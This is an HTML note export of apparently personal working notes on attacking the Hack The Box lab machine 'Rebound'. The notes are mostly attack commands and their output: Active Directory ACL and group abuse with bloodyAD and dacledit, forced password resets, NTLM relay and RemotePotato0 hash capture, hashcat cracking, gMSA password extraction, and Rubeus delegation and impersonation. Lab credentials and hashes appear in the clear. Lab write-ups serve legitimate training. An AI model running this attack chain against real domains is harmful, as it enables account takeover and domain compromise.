+</p><p id="ef29cf24-981b-499a-aa21-e0a3446a4956" class="">Membership of winrm_svc</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="785d783c-eb31-486e-8864-c7d1bb524e73" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get membership winrm_svc                       
+
+distinguishedName: CN=Domain Users,CN=Users,DC=rebound,DC=htb
+objectSid: S-1-5-21-4078382237-1492182817-2568127209-513
+sAMAccountName: Domain Users
+
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=rebound,DC=htb
+objectSid: S-1-5-32-580
+sAMAccountName: Remote Management Users
+
+distinguishedName: CN=Users,CN=Builtin,DC=rebound,DC=htb
+objectSid: S-1-5-32-545
+sAMAccountName: Users</code></pre><p id="32c53330-b742-4686-86ea-db30ea6263a6" class="">
+</p><p id="0bfa6c58-7b8f-4423-9b91-7044e5f902ad" class="">
+</p><p id="55480a85-9fb7-486d-827d-813c44f2a094" class="">Some more</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8f16935e-d243-48fb-904c-269723ace6df" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object &#x27;delegator$&#x27; --attr msDS-AllowedToDelegateTo
+
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
+msDS-AllowedToDelegateTo: http/dc01.rebound.htb</code></pre><p id="12c9eee3-ae55-40d4-8823-f82e7f438ce3" class="">
+</p><p id="084a3b71-daee-43a0-9a2d-3e3c691ad7de" class="">Add oorend to ServiceMgmt group</p><p id="59c808d7-665b-42ed-9ec2-79de189ed216" class=""><code>bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 add groupMember ServiceMgmt oorend</code></p><p id="eb294b19-b4d3-4dbe-b596-34a6f8a2b226" class="">
+</p><p id="d3570164-3d6f-4a89-80ca-be453a90f1cb" class=""><code>bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.77.1 add groupMember &quot;CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB&quot; &quot;CN=oorend,CN=Users,DC=rebound,DC=htb”</code></p><p id="daea45ce-3020-49b9-9e26-1d076cb324da" class="">
+</p><p id="fa7df778-3d9e-49bd-8200-a6834afa4f22" class="">oorend is now part of the ServiceMgmt group</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b0d6b87a-dc67-418e-84fd-02e41b4144d1" class="code"><code class="language-PowerShell">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object ServiceMgmt --attr member
+
+distinguishedName: CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
+member: CN=oorend,CN=Users,DC=rebound,DC=htb; CN=fflock,CN=Users,DC=rebound,DC=htb; CN=ppaul,CN=Users,DC=rebound,DC=htb</code></pre><p id="6c310d2b-4259-4ce6-ba35-b576d29944de" class="">
+</p><p id="a25ca98c-e66c-44f8-bade-426240de6354" class="">*As oorend we can set generic all</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b2fc6558-79a8-425d-a426-d7f0fe87507d" class="code"><code class="language-PowerShell">nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
+nTSecurityDescriptor.ACL.3.Trustee: Domain Admins; ACCOUNT_OPERATORS; LOCAL_SYSTEM
+nTSecurityDescriptor.ACL.3.Right: GENERIC_ALL
+nTSecurityDescriptor.ACL.3.ObjectType: Self</code></pre><p id="6b80450e-07e6-40ea-b382-2d947e89edad" class="">
+</p><p id="215754cb-098d-4c13-9bfa-fb38f0d4d902" class="">
+</p><p id="416e0b98-749e-4fd1-9088-dd5dc0963b1e" class="">Check rights for oorend</p><p id="32636068-889c-41c4-81f5-b2b1dd9006a1" class=""><code>bloodyAD -u ldap_monitor -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.127.20 get object oorend --attr nTSecurityDescriptor</code></p><p id="96e7142b-8479-4af2-8729-6a50f0347fcb" class="">
+</p><p id="38640f9f-a2c7-40f5-a310-10e822bb103b" class="">GEt membership</p><p id="cdd7daee-0938-493d-9bca-169e4d710902" class=""><code>bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.129.77.1 get membership oorend</code></p><p id="de3b459c-f7e3-4584-91b4-2d723f4d09a0" class="">
+</p><p id="c202ce9b-a381-4e31-89dd-3a0e904a2083" class="">Password policy</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0dd100b8-3cef-46fe-a692-b055afa02fc6" class="code"><code class="language-PowerShell">yougotgot㉿yougotgot)-[~/Desktop/HTB/Rebound]
+└─$ crackmapexec smb 10.129.77.1 -u oorend -p pass.txt --pass-pol
+SMB         10.129.77.1     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
+SMB         10.129.77.1     445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
+SMB         10.129.77.1     445    DC01             [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
+SMB         10.129.77.1     445    DC01             [+] Dumping password info for domain: rebound
+SMB         10.129.77.1     445    DC01             Minimum password length: 7
+SMB         10.129.77.1     445    DC01             Password history length: 24
+SMB         10.129.77.1     445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
+SMB         10.129.77.1     445    DC01             
+SMB         10.129.77.1     445    DC01             Password Complexity Flags: 000001
+SMB         10.129.77.1     445    DC01                 Domain Refuse Password Change: 0
+SMB         10.129.77.1     445    DC01                 Domain Password Store Cleartext: 0
+SMB         10.129.77.1     445    DC01                 Domain Password Lockout Admins: 0
+SMB         10.129.77.1     445    DC01                 Domain Password No Clear Change: 0
+SMB         10.129.77.1     445    DC01                 Domain Password No Anon Change: 0
+SMB         10.129.77.1     445    DC01                 Domain Password Complex: 1
+SMB         10.129.77.1     445    DC01             
+SMB         10.129.77.1     445    DC01             Minimum password age: 1 day 4 minutes 
+SMB         10.129.77.1     445    DC01             Reset Account Lockout Counter: 30 minutes 
+SMB         10.129.77.1     445    DC01             Locked Account Duration: 30 minutes 
+SMB         10.129.77.1     445    DC01             Account Lockout Threshold: None
+SMB         10.129.77.1     445    DC01             Forced Log off Time: Not Set</code></pre><p id="a350585b-7488-4dab-8869-5175a268086f" class="">
+</p><p id="c410afed-7320-4c05-847a-e3b47f6e85fd" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a9770ef9-ecbb-4812-a20a-aa06b4789301" class="code"><code class="language-PowerShell">etc/hosts:
+10.10.11.231 dc01 dc01.rebound.htb rebound.htb
+
+add oorend to group:
+bloodyAD -u oorend -p &#x27;1GR8t@$$4u&#x27; -d rebound.htb --host 10.10.11.231 add groupMember SERVICEMGMT oorend
+
+[+] oorend added to SERVICEMGMT
+
+Abuse GenericAll on OU:
+cd /tmp
+git clone https://github.com/ThePorgs/impacket.git
+cd impacket
+python3 -m venv .venv
+source .venv/bin/activate
+python3 [setup.py](http://setup.py/) install
+
+python3 /tmp/impacket/examples/getTGT.py &#x27;rebound.htb/oorend:1GR8t@$$4u&#x27; -dc-ip 10.10.11.231
+export KRB5CCNAME=oorend.ccache
+python3 /tmp/impacket/examples/dacledit.py -action write -rights FullControl -inheritance -principal &#x27;oorend&#x27; -target-dn &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27; &#x27;rebound.htb/oorend&#x27; -use-ldaps -k -no-pass
+
+[*]NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+[*]DACL backed up to dacledit-20230912-072815.bak
+[*]DACL modified successfully!
+
+[*]Now can reset password:
+python3 examples/dacledit.py -action &#x27;write&#x27; -rights &#x27;ResetPassword&#x27; -principal &#x27;oorend&#x27; -target &#x27;winrm_svc&#x27; -dc-ip dc01.rebound.htb -use-ldaps -k -no-pass &#x27;rebound.htb/oorend&#x27;
+
+[*]DACL modified successfully!
+
+[*]Now can set password:
+bloodyAD -u oorend -p &#x27;1GR8t@$$4u&#x27; -d rebound.htb --host 10.10.11.231 set password winrm_svc 
+
+NewPassword123!
+[+] Password changed successfully
+
+[*]Now can login:
+evil-winrm -i rebound.htb -u winrm_svc -p SomePassword83</code></pre><p id="9d5ea7a1-b43e-4a8d-bb21-a753037d983c" class="">
+</p><p id="715321bc-1f58-43b2-a670-f71989b21721" class="">Alternative to the above?</p><p id="89b363a2-6776-4fc0-9749-6da1a9f5bd3e" class="">Try this again, might be quicker without the TGT request ticket</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7afbd0a9-f476-4af2-b179-b22639a3be99" class="code"><code class="language-PowerShell">bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.10.11.231 add groupMember &#x27;CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB&#x27; &quot;CN=oorend,CN=Users,DC=rebound,DC=htb&quot;
+
+#then getting fullcontrol on OU Service Users
+
+bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.10.11.231 add genericAll &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27; oorend
+[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+#then use rpcclient to update the user password ,then use winrm to login
+can we update the password?
+bloodyAD -u oorend -d rebound.htb -p &#x27;1GR8t@$$4u&#x27; --host 10.10.11.231 set password &#x27;newpass&#x27;</code></pre><p id="d134390f-bd66-4e31-a18d-013c9c81a252" class="">
+</p><p id="ac12e620-a7f3-41a1-8184-5dc27658b791" class="">So yeah we can do it all with bloodyAD</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="129e6116-f131-4e2b-bf7b-1ed5d9c60970" class="code"><code class="language-PowerShell">python bloodyAD.py -d rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; --host dc01.rebound.htb add groupMember ServiceMgmt oorend
+python bloodyAD.py -d rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; --host dc01.rebound.htb add genericAll &#x27;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#x27; oorend
+python bloodyAD.py -d rebound.htb -u oorend -p &#x27;1GR8t@$$4u&#x27; --host dc01.rebound.htb set password winrm_svc &#x27;Hacker123$&#x27;</code></pre><p id="173017dc-5584-47f1-94f7-969021a3d9fa" class="">
+</p><hr id="aca4d9db-6496-4aae-9339-d252d4945a7d"/><hr id="62e871ba-2dc0-448b-897b-a7d3b7e4c4d5"/><hr id="5b1fec25-aeb8-433d-a810-73a9d000713b"/><p id="8514b930-98c5-488d-8587-65d40fbb2aa0" class="">
+</p><h2 id="6f75ce01-638e-43b5-a7ef-9488dcd6eda1" class="">ROAD TO ROOT?</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="65ecb3c9-39f9-407f-8e7c-1f88b588d80a" class="code"><code class="language-PowerShell">*Evil-WinRM* PS C:\&gt; net user /domain
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            batch_runner             fflock
+Guest                    jjones                   krbtgt
+ldap_monitor             llune                    mmalone
+nnoon                    oorend                   ppaul
+tbrady                   winrm_svc
+The command completed with one or more errors.</code></pre><p id="2869dfa1-e663-4df0-bba5-4f4cfaf90041" class="">query user</p><p id="d9d5119d-d834-46e6-86a8-6a4c111021e0" class="">/home/yougotgot/Desktop/HTB/Authority/cert/bin/ntlmrelayx.py -t ldap://10.129.77.1 --no-wcf-server --escalate-user normal_user</p><p id="2fba0289-f9ea-49f7-beb7-82671f0b1705" class="">RemotePotato0.exe -m 2 -r 10.10.14.220 -x 10.10.14.220 -p 9999</p><p id="ece4b9a0-841f-470f-b31b-dad451c127fc" class="">
+</p><p id="53f8e9c7-cb7d-478b-a7b9-5169bdc67287" class="">Worked! we have the tbrady hash!</p><figure id="44f51242-2059-4947-b181-bf2e6a449faf" class="image"><a href="Rebound%20bc64f28446e44c6fb0bb16eba25737d2/Untitled%201.png"><img style="width:1646px" src="Rebound%20bc64f28446e44c6fb0bb16eba25737d2/Untitled%201.png"/></a></figure><p id="b0e2b67c-fcf8-40e7-bcfa-2afd3e9b73d7" class="">
+</p><p id="c5e248e8-2fc7-4b32-a029-1d4522a11ad0" class=""><code>hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt</code></p><p id="43a1f6ff-3cbd-4d03-bc87-348539d1be03" class="">
+</p><p id="e55a1eab-c0d6-4ff7-a195-13fec330426d" class="">Lets crack the hash!</p><p id="2aceff25-27f9-4473-a9a6-8d207bba0c0b" class=""><mark class="highlight-purple">tbrady: 543BOMBOMBUNmanda</mark></p><p id="a9a122dd-eaeb-47cd-90e6-7be09a6daa1a" class="">
+</p><p id="7b780e09-377f-4415-b2d3-94a7395751bd" class="">Getting the pasword for delegator$ with tbrady credentials we got:</p><p id="ef34b115-94d1-455c-b80e-6c1f14cc4026" class=""><code>python3 bloodyAD.py -u tbrady -p 543BOMBOMBUNmanda --host 10.129.141.235 get object &#x27;delegator$&#x27; --attr msDS-ManagedPassword</code></p><p id="0a3e79ab-c571-4ee2-92ca-3844a8131c74" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="eefc42cb-5eab-4a5b-ae54-0b1864d81dc4" class="code"><code class="language-PowerShell">python3 bloodyAD.py -u tbrady -p 543BOMBOMBUNmanda --host 10.129.141.235 get object &#x27;delegator$&#x27; --attr msDS-ManagedPassword
+
+distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb
+msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:9b0ccb7d34c670b2a9c81c45bc8befc3
+msDS-ManagedPassword.B64ENCODED: IOCJT/tYf2VGNZVrkcIZv2aLwO+6Ehw/7l7W8qzd809vkDqv2wFGs1cHaR6S9fLT3qo1SupEZbSz2V/yS+CKJDLUSVWpTSKFrogU1K5JUonhbMHPAzduYOJJr9LpgRbyGA7juR3ZyqWQz9nJnqlK6A/FcrVT92BlPdLPggRj5IAHn7GstcyTpSl+AM398LfI9P7o+ffdhg2sxk6HSrlXcQG5U1DdQCKCuKSfxhP+SZ/ztoykdM5DfWWN/yTfw0SAoiBI0TBVLZI6JFDqipbcmbOP4+ktCXIBwyRz9PGmbf2lu+9VZuw0mKR7jC3AlxgrBK2BUgm1O7yk/vwTqsL8TA==</code></pre><p id="09d9cca9-d10b-46d6-b0c6-523bc71d6870" class="">
+</p><p id="942908b0-b352-4425-8af5-3818f15ef2f8" class="">How do we pivot to the domain controller from here? I know that the other computer has some delegation to the DC right? </p><p id="779d178c-3c3e-4102-9176-95375192185d" class="">
+</p><p id="b4bed757-048f-4b33-81ab-ea9fc26b28c3" class="">Will this work?<br/><br/></p><h3 id="84057160-e86b-4805-b3da-eaa5a91dc435" class="">Steps to Pivot</h3><h3 id="f6a286aa-a557-4b20-bb80-cf4d051680e8" class="">Understanding the Situation</h3><ol type="1" id="92369c8b-1427-4945-a4d3-6a4283d4b089" class="numbered-list" start="1"><li><strong>Constrained Delegation</strong>: The <code>msDS-AllowedToDelegateTo</code> attribute indicates that the gMSA account is configured for constrained delegation to the DC (<code>http/dc01.rebound.htb</code>). This means that the account can impersonate users but only to that specific service on the DC.</li></ol><ol type="1" id="f33ac1af-b814-46b3-a1d9-82697d683771" class="numbered-list" start="2"><li><strong>NTLM Hash</strong>: You have the NTLM hash of the gMSA, which is essentially the &quot;password&quot; for that service account in hashed form.</li></ol><ol type="1" id="73057f80-20bd-4bc8-84f7-cce5936fb497" class="numbered-list" start="3"><li><strong>Pass-the-Hash (PtH)</strong>: Use the NTLM hash to authenticate as the gMSA. Tools like Mimikatz or Impacket&#x27;s <code>secretsdump.py</code> can help you with this. The idea is to inject the hash into your current session to impersonate the gMSA.</li></ol><p id="d8981f35-7d2d-409c-b39a-d19210ea21e8" class=""><code>mimikatz # sekurlsa::pth /user:delegator /ntlm:[NTLM_HASH] /domain:rebound.htb</code></p><ul id="def16df6-1e13-4103-ba83-1cf64e5e690d" class="bulleted-list"><li style="list-style-type:disc"><strong>Impersonate Users</strong>: Since the gMSA is configured for constrained delegation, you can impersonate users who have authenticated to it. Tools like Rubeus can help you request TGS tickets for the service you&#x27;re allowed to delegate to (<code>http/dc01.rebound.htb</code>).</li></ul><ul id="76048c80-dce3-4642-a2c9-ab0276f9e776" class="bulleted-list"><li style="list-style-type:disc"><strong>Access the DC</strong>: Use the TGS ticket to access the DC. You can either directly interact with the service you&#x27;re allowed to delegate to or use it as a stepping stone for further lateral movement.</li></ul><ul id="eb46b2c0-fb4f-4e31-ad77-ef05965a1091" class="bulleted-list"><li style="list-style-type:disc"><strong>Privilege Escalation</strong>: Once you have access to the DC, look for opportunities to escalate your privileges. This could involve dumping additional hashes, Kerberos tickets, or exploiting misconfigurations.</li></ul><p id="9a91654b-0638-4e53-8dd0-118d2aec1c44" class="">
+</p><p id="f2188cdc-5d2d-4ae2-aaf8-75913c24244a" class="">Domain SID</p><p id="e90b0a39-0c9e-487c-85cb-6131aa334080" class=""><code>(Get-AdDomain).DomainSID.Value</code></p><p id="cc957d08-b672-4732-a3e3-852647958de9" class="">S-1-5-21-4078382237-1492182817-2568127209</p><p id="dd1cd5e3-aa3c-4658-bb29-fd362b5ab0e7" class="">nt hash</p><p id="dfaaf548-37fe-4408-8290-1c95aa87cf23" class="">aad3b435b51404eeaad3b435b51404ee</p><p id="5311c624-c33a-440d-9387-305a3bf944ef" class="">
+</p><p id="a01214db-842b-435f-afd4-300976adc025" class="">
+</p><p id="82a308c9-99fd-43c9-a6aa-371f4b598db5" class="">Transferred nc.exe and Using powerview.ps1</p><p id="d9311925-831c-45fd-b6ad-46bf5c8aebe5" class=""><code>Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f0ab5b45-c617-4d4b-a65d-b393f723883e" class="code"><code class="language-PowerShell">PS C:\Users\winrm_svc\Documents&gt; Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
+
+userprincipalname name      msds-allowedtodelegateto
+----------------- ----      ------------------------
+                  delegator http/dc01.rebound.htb   
+
+
+PS C:\Users\winrm_svc\Documents&gt;</code></pre><p id="37ceeae3-7373-4279-845d-d24b25af04ba" class="">
+</p><p id="85801f2a-7e5e-41df-8763-b9b979961cd5" class="">
+</p><p id="e9bd4edc-fc17-4228-b4ec-13b5dd353226" class=""><code>Rubeus.exe tgtdeleg /rc4:9b0ccb7d34c670b2a9c81c45bc8befc3 /user:delegator /domain:rebound.htb /sid:S-1-5-21-4078382237-1492182817-2568127209-1000</code></p><p id="a1a9a676-b17c-4c7a-8ba6-b3c2e5c6f55f" class="">
+</p><p id="111e636b-bb17-4d90-a377-6d99b6f0bf04" class="">
+</p><p id="d4521a2c-3239-4b61-8825-c3e53b60ded6" class="">Get-DomainComputer -TrustedToAuth -Properties DnsHostName,MSDS-AllowedToDelegateTo</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c9e42d5e-6bfe-4dd5-823a-4ff579ac8dc5" class="code"><code class="language-PowerShell">PS C:\Users\winrm_svc\Documents&gt; Get-DomainComputer -TrustedToAuth -Properties DnsHostName,MSDS-AllowedToDelegateTo
+Get-DomainComputer -TrustedToAuth -Properties DnsHostName,MSDS-AllowedToDelegateTo
+
+dnshostname      msds-allowedtodelegateto
+-----------      ------------------------
+gmsa.rebound.htb http/dc01.rebound.htb</code></pre><p id="1c273d25-dc2f-465b-8fef-08de86a3ab36" class="">
+</p><p id="6072b5d7-5fe5-4aa9-b924-07f796971671" class=""><code>Rubeus.exe s4u /user:delegator$ /rc4:9b0ccb7d34c670b2a9c81c45bc8befc3/domain:rebound.htb /impersonateuser:Administrator /msdsspn:HTTP/dc01.rebound.htb /sid:S-1-5-21-4078382237-1492182817-2568127209 /ptt</code></p><p id="83e89200-ee92-4bdc-b27c-2e2709ee4545" class="">
+</p><p id="69fdfd35-4dc6-4a5a-936f-2f205a959c37" class="">having fun heh</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1862ff1c-318b-4863-8d40-2b01f9990ec9" class="code"><code class="language-PowerShell">.\Rubeus.exe hash /password:543BOMBOMBUNmanda /user:tbrady /domain:rebound.htb
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : 543BOMBOMBUNmanda
+[*] Input username             : tbrady
+[*] Input domain               : rebound.htb
+[*] Salt                       : REBOUND.HTBtbrady
+[*]       rc4_hmac             : 114E76D0BE2F60BD75DC160AB3607215
+[*]       aes128_cts_hmac_sha1 : A33995844F38022195E60C880E2C8EFC
+[*]       aes256_cts_hmac_sha1 : 5C634AFA0FFAF0AD3AC04FDD47FFD995362B17B6260172644F3723CFCD3D280F
+[*]       des_cbc_md5          : 46FBDCC22C437FCD
+
+
